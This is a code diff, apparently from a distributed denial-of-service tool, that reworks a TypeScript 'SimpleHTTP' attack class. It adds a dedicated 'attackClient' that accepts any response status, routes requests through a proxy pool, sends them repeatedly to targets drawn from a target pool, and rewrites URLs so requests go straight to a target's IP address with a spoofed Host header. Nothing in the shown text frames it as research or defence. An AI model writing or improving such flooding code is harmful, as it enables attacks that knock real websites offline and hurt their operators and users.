@@ -1,4 +1,4 @@
-import axios, { AxiosRequestConfig, AxiosProxyConfig, Method } from 'axios'
+import axios, { AxiosRequestConfig, AxiosProxyConfig, Method, AxiosInstance, AxiosRequestHeaders } from 'axios'
 import { SocksProxyAgent } from 'socks-proxy-agent'
 
 import { GetTarget } from '../external/targetsPool'
@@ -10,14 +10,29 @@ import { sleep } from '../helpers'
 
 export abstract class SimpleHTTP extends Algorithm {
   protected proxyPool: ProxyPool
-  private validateStatusFn: () => boolean
+  private attackClient: AxiosInstance
 
   abstract get method(): Method
 
   constructor (config: Config, proxyPool: ProxyPool) {
     super(config)
     this.proxyPool = proxyPool
-    this.validateStatusFn = () => true
+    this.attackClient = axios.create({
+      timeout: this.config.timeout,
+      validateStatus: () => true,
+      responseType: 'arraybuffer'
+    })
+
+    this.attackClient.interceptors.request.use((config) => {
+      const newConfig = config as AxiosRequestConfig & {ip?: string; url: string; headers: AxiosRequestHeaders}
+      if (typeof newConfig.ip === 'string') {
+        const url = new URL(newConfig.url)
+        newConfig.headers.Host = url.hostname
+        url.hostname = newConfig.ip
+        config.url = url.toString()
+      }
+      return newConfig as AxiosRequestConfig
+    })
   }
 
   isValid (target: GetTarget): boolean {
@@ -47,7 +62,7 @@ export abstract class SimpleHTTP extends Algorithm {
 
     let success = true
     while (success && repeats > 0) {
-      success = await this.makeRequest(target.page, proxyConfig)
+      success = await this.makeRequest(target, proxyConfig)
       packetsSend += 1
       repeats -= 1
       if (success) {
@@ -58,16 +73,15 @@ export abstract class SimpleHTTP extends Algorithm {
     return { packetsSend, packetsSuccess, target, packetsNeutral: 0 }
   }
 
-  protected async makeRequest (url: string, config: AxiosRequestConfig) {
+  protected async makeRequest (target: GetTarget, config: AxiosRequestConfig) {
+    const { ip, page: url } = target
     try {
-      const response = await axios.request({
+      const response = await this.attackClient.request({
         ...config,
-        method: this.method,
         url,
-        timeout: this.config.timeout,
-        headers: HttpHeadersUtils.generateRequestHeaders(),
-        validateStatus: this.validateStatusFn
-      })
+        ip,
+        headers: HttpHeadersUtils.generateRequestHeaders()
+      } as AxiosRequestConfig)
       console.log(`${new Date().toISOString()} | ${url} | ${response.status}`)
       return true
     } catch (e) {
